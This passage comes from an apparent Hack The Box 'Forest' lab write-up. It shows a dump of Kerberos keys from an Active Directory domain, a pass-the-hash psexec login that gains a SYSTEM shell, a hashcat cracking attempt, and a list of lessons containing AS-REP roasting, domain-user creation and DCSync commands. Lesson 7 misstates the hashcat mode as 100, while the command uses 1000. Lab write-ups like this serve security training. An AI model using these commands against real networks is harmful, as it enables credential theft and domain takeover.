krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
forest_pwn:aes256-cts-hmac-sha1-96:46f467cf256ced377396ee6b8d9db484824a0d98a6737307770136729bdd695a
forest_pwn:aes128-cts-hmac-sha1-96:4ceb0e13c13331eaea1cae698c41fe85
forest_pwn:des-cbc-md5:20e9049201a83ba2
FOREST$:aes256-cts-hmac-sha1-96:1c5479cee5331ba25884a4d47b08a7229ea3978b03f79a3778e1291888909304
FOREST$:aes128-cts-hmac-sha1-96:ac6c0d0cf3928ebca5b30f22ba64b918
FOREST$:des-cbc-md5:c20db0ec1c7531e6
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up... 

```

Using Impacket-psexec, we can use the Admin's LMHASH:NTHASH that we have obtained.

```
$ impacket-psexec administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file bJUSIEbK.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service UmQK on 10.10.10.161.....
[*] Starting service UmQK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>
```

Go to Desktop Directory and get your root flag

I tried to crack the above NTLM hash using the hashcat but the rockyou.txt was not able to crack the hash. Here is how I did it tho.

```
Copy the hash in the ntlm.txt file.
$ echo "htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::" > ntlm.txt
$ hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt 
Session..........: hashcat                                
Status...........: Exhausted
```

### Lesson Learned

1. DcSync Attack work when the user has the `ObjectType : DS-Replication-Get-Changes-All ` set.
2. The Account Operator Group in Windows grants the Limited Account Creation Privileges to the user.
3. Once you get the valid list of users, You should check if any of the user has the Kerberos Pre-Authentication disabled; You can get the Kerberos Ticket using `impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass` command. Replace the username.
4. evil-winrm connects on port 5985 by default. When you run the nmap scan, make sure this port is open.
5. the **ACCOUNT OPERATOR** group **GRANTS LIMITED ACCOUNT CREATION PRIVILEGES TO A USER**. 
6. You can add new user in the domain using `net user forest_pwn password /add /domain`. 
7. When you try to crack the NTLM (-m 100 in hashcat) hash, use the `htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::` and save it as txt file then use hashcat command.
8. If you want to import PowerSploit recon module on a target, use `import-module PowerSploit\Recon` Following to that use `Get-Command -Module Recon` to list out the command supported by the Recon module.